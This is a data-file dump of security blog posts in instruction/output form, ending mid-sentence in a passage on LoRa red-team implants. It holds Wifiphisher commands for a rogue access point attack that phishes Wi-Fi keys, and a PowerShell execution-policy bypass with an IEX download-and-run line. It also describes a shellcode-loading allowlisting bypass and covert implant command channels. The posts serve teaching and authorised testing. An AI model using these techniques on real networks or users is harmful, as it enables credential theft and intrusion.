\n\nTraining: \n\nPerform periodic training of employees on identifying and knowing how to handle social engineering tactics. This should include testing policy and procedures often through social engineering calls, phishing, and physical security engagements.  \n\nConclusion: \n\nSocial engineering exploits human trust and is used for gaining initial access into an environment, collecting sensitive data, and/or performing malicious activities such as defaming or damaging a corporation\u2019s reputation. Training yourself and employees about what social engineering is, and how to handle situations when they suspect that they are getting social engineered, is essential. \n\nMy favorite customer quote after we conducted a physical security test is: \u201cWe have had the first-person shooter training, and this experience was much better than that because it demonstrated that someone could gain access to our secure office without proper authorization. We will always verify the identity of visitors due to this exercise. Not because we were told to in a class but because we failed and who knows what you guys had in those backpacks.\u201d \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Install and Perform Wi-Fi Attacks with Wifiphisher\"\nTaxonomies: \"General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Jordan Drysdale, Wireless, How to, wifiphisher, wireless testing, wireless tools\"\nCreation Date: \"Thu, 11 Apr 2024 15:00:00 +0000\"\n\ntl;dr: Install Wifiphisher on Kali and run a basic attack. \n\nThis crappy little copy/paste-able operation resulted in a functional Wifiphisher virtual environment on Kali (as of January 22, 2024).  \n\napt-get install -y libnl-3-dev libnl-genl-3-dev libssl-dev python3-virtualenv \ncd /opt/ \ngit clone https://github.com/wifiphisher/wifiphisher.git \ncd wifiphisher \nvirtualenv -p python3 env \nsource env/bin/activate \npython3 -m pip install ConfigParser \ngit clone https://github.com/wifiphisher/roguehostapd.git \ncd /opt/wifiphisher/roguehostapd \npython3 setup.py install \ncd /opt/wifiphisher \npython3 -m pip install six \npython3 -m pip install . \nwifiphisher -e CORP-RETAIL -p wifi_connect -kB \ndeactivate # when done \n\nTwo additional edits were made inside the rfkill.py file included with the Wifiphisher installation. Both instances of the following were updated to \u201cwrite bytes\u201d instead of just \u201cwrite\u201d.  \n\nfout = open(dpath, \u2018wb\u2019) # line 104 \nfout = open(dpath, \u2018wb\u2019) # line 135 \n\nThe Wifiphisher toolkit provides an operator some novel approaches for interrogating wireless networks and clients. One of the most interesting and potentially beneficial attacks with Wifiphisher, in this author\u2019s opinion, is the coffee shop, known beacons (-kB) attack (which is similar to the Wi-Fi KARMA attack).  \n\nHere\u2019s some quick background on wireless clients and the KARMA attack: \n\nAlmost all operating systems will automatically attempt to reconnect to previously used wireless networks.  \n\nThis is potentially dangerous and exploitable behavior. \n\nThese requests are sent from the client as part of a preferred network list (PNL) advertisement broadcast. \n\nThis is potentially dangerous and exploitable behavior. \n\nThe known beacons attack in Wifiphisher is similar to the Wi-Fi KARMA attack. \n\nKARMA accepts the client\u2019s advertised list of preferred networks (PNL) \n\nKARMA then turns those into an SSID and hopes the client connects \n\nthe -kB attack just advertises a lengthy list of common SSID names one by one \n\nYes, the list is configurable \n\nWireless clients may auto-connect to the networks to which they\u2019ve connected previously \n\nThe next command and screenshot invokes Wifiphisher. The invoke presents any connecting clients the wifi_connect phishing module.  \n\nwifiphisher -e CORP-RETAIL -p wifi_connect -kB \n\nThe next screenshot repeats again after the attack.  \n\nKnown Beacons Attack Invocation with Wifiphisher\n\nOf note here, the initial command brings up the operator\u2019s console shown below. The operator\u2019s console includes the SSID we cloned from the retail space (CORP-RETAIL) and presented to clients as an open network. The console also includes some of the known networks from the attacker\u2019s list (SFO FREE WIFI, FREE WIFI, Hotel, blah). Established client connections also show up here. Also of interest, once a Windows client has connected, we see that client attempting connections to windowsupdate.com and msftconnecttest.com. The request for a text file here is likely part of the client\u2019s algorithm to decide whether it has a valid and fully established internet connection.  \n\nFinally, as shown in the previous and next screenshots, this victim submitted data to the phishing page. \n\nOperator\u2019s Console View of Wifiphisher Tool\n\nThe client side of this attack, at least a Windows client, appears something like the following: The client is presented with the phishing page and a JavaScript modal dialog box. The box prompts the connected client for their CORP-RETAIL key to fully \u201cconnect\u201d as a lure. Inputs then show up in the console above. \n\nWindows Client Perspective on Wifiphisher \n\nThis is the same screenshot shown as captured at initial invocation and after tool shutdown. The console also contains the victim input as listed in the wfphshr-wpa-password value.  \n\nClient Input Captured in Console\n\nI also reviewed this attack on a Mac client, just for research purposes. The broadcast network was slightly different but achieved the same impact. The client was redirected to the Mac\u2019s user-agent identified version of the wifi_connect lure.  \n\nWifiphisher\u2019s Version of an Apple User Agent String Captive Portal\n\nThe client was identified on initial connection appropriately as iOS/MacOS device. Client inputs were captured as shown.  \n\nApple Device Connection to Wifiphisher Access Point \n\nThanks for reading. Stay safe and use your powers for good and not evil.  \n\n-jd \n\nReferences\n\nhttps://wifiphisher.org\n\nhttps://github.com/wifiphisher/wifiphisher\n\nhttps://en.wikipedia.org/wiki/KARMA_attack\n\nhttps://wifiphisher.org/ps/wifi_connect\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"At Home Detection Engineering Lab for Beginners\"\nTaxonomies: \"Blue Team, Guest Author, How-To, Detection, framework, homelab, mitre att&ck\"\nCreation Date: \"Thu, 02 May 2024 15:00:00 +0000\"\n\n| Niccolo Arboleda | Guest Author\n\nNiccolo Arboleda is a cybersecurity enthusiast and student at the University of Toronto. He is usually found in his home lab studying different cybersecurity tools and working on projects. He is passionate about defending critical infrastructure from cyber-attacks. \n\nThere are always new and evolving threats that target our environments. It is essential to detect these threats before they cause actual harm to people and their livelihoods.\n\nIn this blog, we will cover how to build a simple Security Information and Event Management (SIEM) environment to simulate attacks and give us an understanding of how vital detection is in identifying threats and creating defenses against them. Links to all the software used and relevant documentation will be in the references section at the end of the blog.\n\n*If you get stuck at one point or another, please refer to the documentation. You will find solutions to your issues there.\n\nSetting Up the Environment\n\nWe will need the host machine (your computer), a hypervisor, a manager server, and an endpoint to build the environment. \n\nThe Hypervisor:\n\nThe first thing we need to do is pick a hypervisor on which to build our environment. A hypervisor is software that allows us to create virtual machines using our host machine. It is useful in this kind of scenario because we won't need multiple physical computers to create the environment. There are many hypervisors, but in terms of accessibility and ease of use, the free versions of VMware Workstation or VirtualBox will do just fine. The hypervisor I used for this project is VirtualBox.\n\nThe Manager Server:\n\nWe will use Wazuh as our manager server, as it is open-source and well supported. Wazuh is a platform used for threat detection and incident response. There are other open-source SIEM solutions, such as The ELK Stack or OSSEC , if you would like to explore other options.\n\nIn this instance, I recommend using the OVA version to simplify your installation process. The OVA version is a standalone Linux (Amazon Linux 2) virtual machine image with the Wazuh server already installed. I hosted the server inside VirtualBox.\n\nWhile the documentation section of the Wazuh website will have instructions on installation, there is a high level overview in the below section.\n\nSearch installation alternatives and click on the Virtual Machine (OVA) link.\n\nDownload the image by clicking on the wazuh-4.7.3.ova (sha512) link (please note the version may have changed). \n\nOnce the image is downloaded, click the import button on VirtualBox and load the file.\n\nBefore starting the virtual machine, we will need to go to settings and change the display setting to VMSVGA to prevent the virtual machine from crashing, as outlined in the Wazuh documentation.\n\nOnce we have the manager server up and running, we will need to take note of its IP address using the ipconfig command so we can load the dashboard later.\n\nThe Endpoint:\n\nThe endpoint will have three main parts, which are: the operating system, the agent, and the attack-simulation framework. Note: the agent and framework will be installed on the endpoint virtual machine, not the host machine.\n\nOperating System:\n\nWindows will be used as the operating system for the endpoint virtual machine. The first step is to go to the Windows developer environment webpage and get a virtual machine that aligns with our hypervisor.\n\nOnce the image is downloaded, it needs to be imported into VirtualBox like the Wazuh server manager. We will select Import and select the Windows VirtualBox instance.\n\nNext, the virtual machine needs to be started.\n\nYou do not need a license in order to have a functional Windows virtual machine.\n\nThe Agent:\n\nThe installation instructions can be found in the Wazuh documentation.\n\nOnce downloaded, install the Agent and run the manager.\n\nUse the IP address of the manager server to configure the Wazuh agent and save the setting.\n\nTo check that everything is in order, go back to your host machine and open a browser. Input https:// and it should let you access the dashboard. Your endpoint machine should show under agents outlined in the image below.\n\nAttack-Simulation Framework:\n\nIn order to complete a detection lab, we need a framework to reference cyber attacks to our specific environment. In this case, we will be using the MITRE ATT&CK framework. \n\nThe MITRE ATT&CK framework is a knowledge base of adversary techniques and tactics that are observed in the real world.\n\nTo simulate attacks on the endpoint, we will be using Invoke-Atomic. Atomic Red Team has a repository of detection tests based on the MITRE ATT&CK framework. Invoke-Atomic is the PowerShell module of Atomic Red Team. This tool helps to aid cybersecurity professionals in understanding, as well as simulating, relevant threats in their environment.\n\nTo install Invoke-Atomic, we will need to bypass PowerShell execution policies that might prevent the installation. In this case, I ran a PowerShell command under Administrator that disables the execution policy by replacing the \u201cAuthorization Manager.\u201d\n\nfunction Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield(\"_context\",\"nonpublic,instance\").getvalue( $executioncontext)).gettype().getfield(\"_authorizationManager\",\"nonpublic,instance\").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager \"Microsoft.PowerShell\"))} \n\nDisable-ExecutionPolicy .runme.ps1\n\nThen, I ran the installation command for both Invoke Atomic and its framework.\n\nIEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);\nInstall-AtomicRedTeam \u2013getAtomics\n\nThe screenshot below shows a successful installation:\n\nAttack Simulation Using Invoke-Atomic\n\nOnce all the components are in place and running. We can start simulating attacks on the endpoint to see what alerts will be triggered by the attack simulations.\n\nA simulation can be run through PowerShell. The command I used is:\n\nInvoke-AtomicTest T1003 -TestNumbers 6\n\nIn this specific example, I used the attack reference T1003 - 6, as shown below, which is a credential dumping attack utilizing kmgr.dll and rund1132.exe.\n\nCredential Dumping is an online attack that steals credentials, typically from random access memory (RAM).\n\nUpon starting the simulation, the following application (Stored User Names and Passwords) is triggered.\n\nThe Wazuh dashboard also registered activity from the attack, stating changes in the registry values and key integrity. The rules 750 (Registry Value Integrity Checksum Changed) and 594 (Registry Key Integrity Changed) were recorded for further analysis. They can be found on the Security Event tab in the Wazuh dashboard.\n\nIt is important to note that not all attack simulations will yield an alert. This is not necessarily a bad thing, since it identifies a gap that can be filled in the detection system. You can also consider combining alerts that do appear to make your own custom detections.\n\nSummary\n\nBuilding our environment, executing attack simulations, and seeing if any alerts appear on the dashboard can help us begin identifying gaps in our detections and tuning our SIEM to lower the noise and bring the relevant alerts to a higher level in the system. This is where your detection engineering adventure begins.\n\nAs a final note, I want to say that the field of cybersecurity is vast, and many disciplines are involved. Don't be discouraged if you are new to the industry and genuinely passionate about defending people from ever-increasing technological threats. We\u2019re on this journey together, and I am rooting for you. \n\nResources\n\nhttps://www.virtualbox.org/\n\nhttps://documentation.wazuh.com/current/deployment-options/virtual-machine/virtual-machine.html\n\nhttps://www.microsoft.com/en-ca/software-download/windows11\n\nhttps://documentation.wazuh.com/current/installation-guide/wazuh-agent/index.html\n\nhttps://github.com/redcanaryco/invoke-atomicredteam/wiki\n\nhttps://github.com/redcanaryco/invoke-atomicredteam/wiki/Execute-Atomic-Tests-(Local)\n\nhttps://attack.mitre.org/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Red Teaming: A Story From the Trenches\"\nTaxonomies: \"Informational\"\nCreation Date: \"Thu, 18 Apr 2024 17:08:53 +0000\"\n\nThis article originally featured in the very first issue of our PROMPT# zine -- Choose Wisely. You can find that issue (and all the others) here: https://www.blackhillsinfosec.com/prompt-zine/\n\nI remember a day when a customer (now a friend) bragged that the deployed application allowlisting policies at his organization were highly secure, thorough, and well vetted. Naturally, I asked about the process he undertook to create such a thing. My friend replied, \"We started by considering all of the Microsoft Windows operating systems and applications to be hostile. Everything was blocked and we built from the ground up.\"\n\nI have to say that I was intrigued. How many organizations would live through the pain of application allowlisting on steroids \u2014 an approach that blocked everything and then selectively allowed only what is needed, including the operating system itself? For a little context, we have had a relationship with our friend for a number of years. At the start of our customer relationship, this person asked the right questions. In response, we literally posed: \"Do you want to take the red pill, or the blue pill?\" He chose red and began a program to build some of the most robust defenses that he possibly could. \n\nZoom forward a few years into this relationship and we graduated to a full-blown red team exercise, as many in our industry would think appropriate. Coming into the red teaming exercise, I and my teammate Ethan had decided that we really wanted to gain physical access to the organization and implant a command channel on the first machine we encountered. We began our preparations in earnest and reached the point of considering what command channel we wanted to implant. \n\nWhat could we do? There was no possibility of running any binary content, any visual basic scripts, macros, PowerShell, and/or commands on these systems. We knew just how much the program had developed and had been locked down hard. To give a little more context, we are speaking of running our operations in early 2017. A lot of the current application allowlisting bypasses that are fairly widely published now were not really public knowledge. \n\nAs I was researching around the internet for application allowlisting bypasses, I came across a few Twitter posts from @subTee and, having encountered some of his materials before, began to get interested in the techniques that were published mostly as GitHub gists. What caught my attention was an attack that leveraged the REGSVR32.EXE binary, which, in turn, would load the Windows scripting runtime DLL named \"scrobj.dll\" to execute a block of Jscript. This attack became well recognized by the moniker \"SquiblyDoo\" around that same time period. \n\nFrom my perspective though, I found the need to fetch a script object from an external resource to be unnecessary, so I decided to modify the attack. I authored some code I later called \"WEvade\" (I am not good at names) which used the same technique as SquiblyDoo but implemented in a custom DLL that did not attempt to interpret any form of script. Instead, the attack read the required shellcode from a file or web server and directly executed base64-encoded shellcode contained within that file or URL. \n\nAfter we tested and ensured that the custom malware would successfully evade the antivirus solutions and application allowlisting, we began preparing for our physical incursion! Between Ethan and I, we geared up with a Bash Bunny and a USB stick as backup, just in case the Bash Bunny failed for any reason. \n\nThe Bash Bunny is a fun hacker gadget that has a small Debian Linux installation on it, and can present itself as USB storage or a human keyboard interface device for the express delivery of malware payloads!\n\nFinally, the day had arrived for our adventure. Ethan and I nervously pulled up to a parking meter of the street next to the target organization premises. We both had all of the gear in hand, and cellular modems for communications to the command channel infrastructure. \n\nIn these situations, there is always that nervous sort of moment when you have the discussion that goes along the lines of, \"Ok, who is going to attempt to enter the premises and do the nerve-wracking part of the work?\" I managed to convince Ethan to do that part of the exercise, so he grabbed his bag and set out for the lobby. As it turns out, this was a multi-tenant and multi-floor building, so Ethan literally picked someone who looked like and employee that might work at the organization and followed them into the elevator. Later, we discovered that Ethan had actually hitched a ride up the elevator with the company CEO, making small talk all the way up. \n\nEthan quickly found that getting off at the correct floor allowed him direct access to the organization, so he walked casually into the door and found the nearest computer workstation, immediately whipping out the Bash Bunny and plugging it in. Ethan then discovered that the organization's policies did not allow human interface-style devices to be connected, so he reverted to a USB storage method. He also had trouble with this mechanism and began getting very nervous, as he was an unknown face messing around with a computer workstation in a pretty open office setting!\n\nThe following SMS transaction between us then transpired whereby Ethan asked me to quickly deploy a web server with the payload files on it. The funniest part of the entire SMS transaction is when I realized that Ethan did not just want a web server, but a web server with the payload files on it. I have been accused of being \"too literal\" in the past. This time, it was along the lines of anxiety-driven stupidity. See the SMS right here:\n\nEthan: [It's] giving me index.html\n\nJoff: Yes that's right. You want something else??\n\nEthan definitely must have thought I had either lost my mind completely or was playing a really poorly-timed joke. \n\nNear hysterical and rapid pace red teamer SMS exchange in the heat of battle\n\nIt worked! We got a command channel fully operational, and I did my customary \"root dance\" in the driver seat of my rental vehicle downstairs. \n\nAs we later in the day were regaling our success, celebrating mightily that we had bested the application allowlisting deployment, our point of contact and friend told us that he almost succeeded in stopping us. \n\nOf course, we were feeling pretty cocky by that time and asked how that could be possible. I mean, we had won that first hurdle of gaining a foothold! As it so happens, our customer had an interesting solution deployed that detected whenever any USB storage device was connected to one of his workstations. The defense solution had indeed done its job and alerted the system administrator in his office that an unknown USB device had been connected to this workstation. \n\nBeing very security conscious, the alerted system administrator made his way upstairs to the workstation cubicle area to find out what was going on. As he was on his way, he needed a quick bathroom break, by which time Ethan had already succeeded and had hightailed his way out of the office pronto! Amusingly, Ethan even ran into the system administrator on his way out, giving quick eye contact and trying to continue looking casual while leaving the scene. \n\nI suppose that the moral of the story is that, \"When you gotta go, well, you just gotta go, right?\" Who would have known that a penetration tester (aka threat actor) had just run in the door and dropped a malware payload, only to exit stage left and somehow completely avoid revealing his purpose by virtue of lucky timing?! As was also discovered later, it was fortuitous that Ethan even found an unoccupied workstation without the screen being locked. So ends this tale from the Red Teaming trenches where, by a combination of skill and sheer luck, we bested the people, process, and technology literally by seconds, and, of course, had a great deal of fun and laughs afterwards. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Deploy an Active Directory Lab Within Minutes\"\nTaxonomies: \"Alyssa Snow, External/Internal, General InfoSec Tips & Tricks, How-To, Informational\"\nCreation Date: \"Thu, 25 Apr 2024 15:00:00 +0000\"\n\nCreating your own lab can sound like a daunting task. By the end of this blog post, you will be able to deploy your own Active Directory (AD) environment in minutes! All you will need is a browser to access your lab environment so you can do your AD R&D (Research & Development) anytime, anywhere.\n\nSnap Labs\n\nSnap Labs1 is a platform that simplifies building and managing lab environments. It can be used to create cyber ranges for training or Research & Development (R&D). The Snap Labs platform is owned by Immersive Labs2 and is used by security training organizations such as Zero Point Security.3\n\nPrerequisites - What You Will Need\n\nInternet access\n\nA web browser\n\nAn AWS account4\n\nHow to Sign Up\n\nTo sign up for Snap Labs, navigate to https://dashboard.snaplabs.io/signup. Once you sign up for Snap Labs, you will be asked to provide details about your AWS account.\n\nImmersive Labs Register\n\nSnap Labs deploys lab infrastructure in AWS using the credentials that you provide it. You can view the Cloud Formation stack used by Snap Labs in AWS by selecting the SnapLabsManagement link on the settings page.\n\nAWS Account Information in Snap Labs\n\nAn example of the SnapLabsManagement dashboard in AWS CloudFormation is shown below.\n\nSnap Labs Management Cloud Formation Events\n\nIf you are curious about the templates used to build the underlying lab infrastructure, you can review the CloudFormation template used by selecting Template.\n\nView CloudFormation Template\n\nRange Templates\n\nOnce you've set up your account, Snap Labs lets you create a range based off existing templates or build from scratch to create your own range (lab environment). Select Create new range in the Ranges page.\n\nCreate a Range\n\nSnap Labs provides several Range Templates that are available by default. To view these templates, select Range Templates in the side bar.\n\nAvailable Default Templates\n\nTo view details about an existing template, click on the template name. This will display a basic description, network diagram, and an estimated running cost.\n\nEstimated Running Cost of Splunk Attack Range\n\nDeploy Introduction Active Directory Lab\n\nLet's get started by launching the AD Quick Start - 2019 range. To launch a range based off a template, select the rocket ship button.\n\nActive Directory Template\n\nThis will redirect the browser to a form where you can enter the range name and description.\n\nSet Name and Description\n\nNext, you will see your range pop up in your Ranges page. To interact with the lab, select Manage.\n\nRanges Running\n\nThe AD Quickstart - 2019 template has a domain controller, a Windows server, and an admin machine. The admin machine serves as a jump box from the attacker machine to the internal network (lab network). Once all three systems display the green Running icon, your lab is ready to go!\n\n*Don't be alarmed if this takes a few minutes.*\n\nAD Lab Running\n\nThe user credentials for each system can be found under Edit > Credentials > Edit tab located in the system settings.\n\nCredentials for RDP User\n\nVPN Access to Range\n\nSnap Labs allows you to configure various VPN configurations for various access roles in the lab environment. To create your VPN configuration file, select the access type and operating system. Then, you can download the VPN configuration and connect from your system via RDP/SSH.\n\nVPN Configuration\n\nBrowser-based Access to Range\n\nTo connect to your lab environment via the browser, navigate to the target system and click Connect in the Snap Labs UI.\n\nConnect to Domain Controller\n\nAfter you click connect, another tab will open with a remote desktop session. You can copy & paste in the guacamole instance, which is super useful, especially when you want to run a long command.\n\nBrowser-based Connection to Domain Controller\n\nNow you've successfully deployed your very own Active Directory environment!\n\nIn the next section, we will cover some neat features you may want to take advantage of to customize your lab environment.\n\nCustomize Your Cyber Range\n\nWhen a new range is created, a basic Readme is generated. Each template provided by Snap Labs also contains a Readme.\n\nReadme for AD Quickstart 2019 Template\n\nAs you customize your environment, you can modify the Readme to help you document your newly created lab environment.\n\nA diagram is built automatically for each range. The network diagram of the AD Quickstart - 2019 template is shown in the figure below.\n\nNetwork Diagram\n\nWhen you add new systems to your range, the diagram will automatically update. To add a new system, go to Systems > New Systems.\n\nSelect New System\n\nNext, specify the system details. As shown in the figure below, there are various operating systems to select from, ranging from Microsoft Windows to Kali Linux.\n\nAdd System\n\nYou can alternatively use a custom image by specifying the AMI, as shown in the figure below.\n\nAdd Image via Custom AMI\n\nSimilar to AWS Security Groups, you can configure basic inbound/outbound network rules via the Settings > Subnets tab.\n\nConfigure Inbound Rules\n\nYou can configure your own DNS name in DHCP settings.\n\nDHCP Settings\n\nYou can take snapshots of a single system in your lab environment or snapshot the entire lab, which can be helpful while you experiment if you want to revert to a previous state.\n\nSnap Shots\n\nSomething important to note is the Auto-Off feature. You can set this option in the General settings. If you are anything like me, you may start building a lab, begin hacking away, then something shiny pops up...\n\nYou get distracted, close out your window, or walk away and you totally forget about the running lab. To avoid unnecessary AWS bills, you can set the Auto-Off feature, which will suspend your lab when you are inactive. This will stop the running instances but will not destroy the lab infrastructure which means that charges may accrue despite turning off the lab.\n\nAuto-Off Setting\n\nFrom the Settings > General tab, you can save the changes made to your Range and power it down to use later or delete the range if you no longer wish to use it.\n\nSave/Delete Range Settings\n\nNow you've set up your very own Active Directory environment that you can build upon, destroy, and redeploy as you wish!\n\nTemplatize Your Range\n\nSo, now that you've set up your lab environment, let's save the range as a template so you can easily relaunch and build upon it in the future.\n\nCreate a Template\n\nOnce you've created your template, you can share it privately by specifying individual emails, or you can make the template public. To share your range, simply select the range and scroll to the Sharing section to create a shareable link.\n\nCreate Shareable Link\n\nBy creating a publicly shareable link, anyone who can view the link will have access to your Range Template to deploy using their own account. Once a range has been shared you cannot revoke access.\n\nPlease review the following message from Immersive Labs before creating a publicly shareable template.\n\nPublic Template Warning from Immersive Labs\n\nFor more information about Snap Labs, check out the documentation: https://docs.snaplabs.io/docs/getting-started\n\nSummary\n\nIn this blog post, we accomplished the following:\n\nCreated a Snap Labs Account\n\nExplored some of Snap Labs features\n\nLaunched our very own Active Directory Cyber Range\n\nCreated a cyber range template, which can be used to deploy an Active Directory lab environment that can be shared with others\n\nFootnotes\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Offensive IoT for Red Team Implants - Part 1\"\nTaxonomies: \"Hardware Hacking, Physical, Red Team, Red Team Tools, Tim Fowler\"\nCreation Date: \"Thu, 09 May 2024 15:00:00 +0000\"\n\nThis is part one of a multipart blog series on researching a new generation of hardware implants and how using solutions from the world of IoT can unleash new capabilities.  \n\nBackground\n\nBack in April 2023, I took a deep dive into the state of cybersecurity in space systems. One of the initial goals of the effort was to learn as much as I could and then build something that others could play with, hands on, to get their first taste of how things in space work. That goal was actualized at Wild West Hacking Fest in October of 2023, where two 1u CubeSats1 were deployed for attendees to work through a guided lab that mimicked real world threats to space systems.\n\nWhy am I telling you this? Well, as part of the development process for the CubeSat labs, I knew fundamentally the success or failure of the effort was dependent on having a solid bi-directional communication system that allowed for not only being able to receive telemetry data from the CubeSats but, most importantly, also allowed for telecommands to be issued remotely without physically being connected to the CubeSat.\n\nUltimately, I settled on an implementation that leveraged LoRa (Long Range)2 modulation because it was relatively affordable, operated in a US ISM Band of 915Mhz (thus not requiring any specialized RF circuitry or license to operate) and avoided the grossly over-crowded 2.4GHz portion of the spectrum.\n\nFor the CubeSats themselves, I used a commercially available breakout board that used a RFM95 LoRa module, and it worked well. However, for the ground station side of the equation, I could not just plug one of the breakout boards into a computer, so I ended up developing a custom PCB that utilized the same RFM95 LoRa module as the commercial option but also included a Raspberry Pi Pico W to control the module and interface with a computer.\n\nIt all worked, the labs were a success but, again, why is this important? Well, let\u2019s dive in\u2026\n\n0x01: Hardware\n\nRight before the 2023 holiday season, I conversed with a friend regarding possible practical applications of the CubeSat research. Thinking about the various details of the CubeSat project, it did not take very long before I really homed in on the foundational element that made it possible \u2013 communications. Specifically, command and control of a remote system over LoRa. That was it; that was the key. I knew there would be a way to pivot from CubeSats to figuring out how to use the communication channel for offensive purposes.\n\nLike most projects I start, I just dove in headfirst, without even as much as a quick Google search to see if anyone else had done or was doing what I was thinking about. YOLO dev, am I right??\n\nFor the rest of this post, I am going to focus on the hardware only. I may mention some software aspects, but I will not be going into detail about any software specifics beyond functionality and capabilities. Do not fret though, part two of this series will be focused on the software and implementations, so stayed tuned.\n\nIf you remember, in the background section, I ended up creating a custom PCB to facilitate PC to LoRa module communication. Well, that was the result, but it started here. It actually started on a breadboard, but this was what came next: a PCB with a Raspberry Pi Pico W and Adafruit RFM95 LoRa module soldered using through-hole header pins to the PCB.\n\nUnpopulated Through-Hole PCBs\n\nFirst Iteration of a Pico-LoRa Board\n\nThis setup worked well for my testing purposes and there really was nothing wrong with it other than the cost was higher than I wanted it to be, with it being about ~$32 USD, give or take, per board.\n\nEventually, after multiple failed PCB designs, I ended up with a PCB that used surface mount components and reduced the cost to about ~$14 USD per board, and I got to learn all about PCB design and fabrication; win-win.\n\nCompleted Pico-LoRa PCB in Acrylic Case\n\nCool, so we have hardware now what? I am so glad you asked.\n\nFirst, we need a little primer on LoRa.\n\n\u201cLoRa (short for long range) is a spread spectrum modulation technique derived from chirp spread spectrum (CSS) technology. Semtech\u2019s LoRa is a long range, low power wireless platform that has become the de facto wireless platform of Internet of Things (IoT).\u201d  - https://www.semtech.com/lora/what-is-lora\n\nI am not going to bore you with the details of chirps and what not, but what you really need to know is that LoRa is a low-bandwidth communication that can traverse much greater distances than, say, traditional Wi-Fi in the 2.4 or 5.8GHz bands of the spectrum. (NOTE: 802.11ah Halow is the exception here. Range should be more or less the same given the same output power.)\n\nNow, imagine bolting on the ability to communicate with a device over LoRa, instead of using the more ubiquitous Wi-Fi options typically used when it comes to physical implant devices. Are you with me?\n\nI am not going to name any specific physical implant devices, but you know the type of devices I am talking about. Those that will emulate keyboards and mouse inputs, automatically run commands and scripts (as well as other attacks) most automagically upon the device being connected to a host computer.\n\nThis class of physical implant device works well, but there are some limitations you must account for when using them. The biggest limitation is around control of the device itself. With most of the common implant devices out there, there are basically a couple of options for being able to control the implant device. The first method would be to have a device to use the host computer\u2019s internet connection and traverse that to a web service where control commands can be issued and sent back to the device. This often can work, but there is no guarantee. Then, there is a similar option of having the device join an open Wi-Fi network and backhauling command and control traffic via that network. Again, this works, but is reliant on the presence of an open network. There is also the option of using Bluetooth to be able to connect to the device as a C2 channel, but Bluetooth is limited range and, in some cases, the presence of a new Bluetooth device in the environment can be an instant indicator that something is afoot. The same thing could be said for using the device to host a wireless network that, as an operator, you would connect to in order to initiate control of the device, but it suffers the same issues as Bluetooth in terms of limited range and potential detection.\n\nLoRa enters from stage left\u2026\n\nBy utilizing LoRa-based communication for command-and-control capabilities of a physical implant device, many of the limitations and potential points of detection are eliminated. For instance, many mature organizations have robust wireless intrusion preventions solutions that can detect a rogue access point or even rogue Bluetooth device. How many people have even thought about detecting LoRa, much less actually implemented a method for doing so? Unlike other IoT protocols \u2014 like Zigbee and X-bee that primarily operate in the 2.4GHz spectrum, which is heavily populated and, in some cases, monitored \u2014 the 915 MHz band used by LoRa is largely unmonitored, especially from a rogue device perspective. By simply augmenting the existing communication options with current day physical implants with a LoRa-based solution, the likelihood of detection on the airwaves goes down considerably.\n\nYou may be asking yourself, \u201cCouldn\u2019t you just monitor the airwaves for LoRa devices?\u201d and that would be a great question to ask. The answer is yes, you can, BUT it is not as simple as that. First, LoRa is a proprietary modulation scheme that requires physical hardware to be able to use it. That also means you need to have physical hardware that understands the modulation of LoRa to listen to it.\n\nYou can use software-defined radio devices, like the RTL-SDR or HackRF, to pick up on the potential presence of LoRa communications by looking for the characteristic chirps, but that is about it. You will not be able to demodulate it (as of now) and really will not have any more context to what is happening other than that something is happening. Here is the kicker though: Remember how LoRa \u201chas become the de facto wireless platform of Internet of Things (IoT)?\u201d Well, that is a very true statement, and there is very likely a device using LoRa within range of where you are reading this from. Everything from power and gas meters to proliferation of \u201csmart devices\u201d are using LoRa to communicate. There are entire global-wide area networks (WANs) built using LoRa and subsequent LoRaWAN protocols to carry data to and from the internet from IoT devices.\n\nEven if you are able to detect the presence of a rogue LoRa device within your environment, you are going to have an uphill battle of isolating, communication, and being able to see what data is being sent over this out-of-band channel. Assuming you can identify the traffic, you would need to configure a LoRa radio module to the exact settings, such as spreading factor (SF), coding rate (CR), and bandwidth to see the content of the data stream. Then, you would also need to brute force your way to determining the node address that data is being sent to \u2014 luckily, there are only 255 options. Lastly, if you are able to fine tune your radio with all these parameters, you probably are going to be faced with encrypted data. Again, good luck.\n\nYou will be better off just trying to find the rogue device than trying to see the data stream. Time to go fox hunting. (https://en.wikipedia.org/wiki/Transmitter_hunting)\n\nNeedless to say, it can be very difficult to detect if a device is using LoRa, much less a rogue device connected to one of your organization\u2019s assets. Got it, hard to detect with current tooling. But why else should LoRa be used? Again, another fantastic question my reader friend!\n\nThe short but long (pun) answer is range. I will not bore you with the physics of radio signal propagation in relationship to frequency, but the ability to plant a device and then control it remotely without the need to be in close proximity to said device is kind of important. Don\u2019t want to get caught hanging outside the secretary\u2019s office trying to run an attack, right?\n\nThis is where LoRa can shine. In July 2023, a new world record distance a LoRa communication traveled and was received was 830 miles.  https://www.thethingsnetwork.org/article/new-lora-world-record-1336-km-830-mi\n\nUnderstand, that is far from the norm, but that is ~4.3x increase of the world record Wi-Fi connection. Using increase of ~4.3x when compared to Wi-Fi is probably a little high for real world everyday experience, but in my testing, a 3x improvement of distance was pretty standard. Now, I did not in any way perform very scientific experiments to determine this but rather the \u2018crude drive down the road to see when the signal drops out\u2019 method. Your mileage will vary, but in most normal cases, the small LoRa modules with even a basic wire antenna is strong enough to have its signal escape out of the building, into the parking lot, and beyond.\n\nWith a device indoors, I have been able control an implant device from close to 500 meters away. Yay physics!\n\nLet\u2019s recap: physical implant device modified with LoRa module produces a long(er) range convert communication channel for controlling said implant. Sweet.\n\nIt\u2019s been around 1000 words since I was talking about hardware, so let\u2019s circle back to that. The original testing used the PCBs I designed for the CubeSat lab, which worked great for testing purposes and could reasonably be used in the field, but due to the technical limitations of the Raspberry Pi Pico W, such as lack of mass storage capability and not easily reprogrammed over-the-air, I felt the need for a complimentary device with more capabilities and just a little more \u2018oomph\u2019 if you will.\n\nSo, here enters the next iteration of hardware implant.\n\nWhat you see above is a pretty simple setup, all based around a Raspberry Pi Zero W. These tiny single board computers have been around for a long time now, and there have been some incredible projects built using them for physical implants, such as 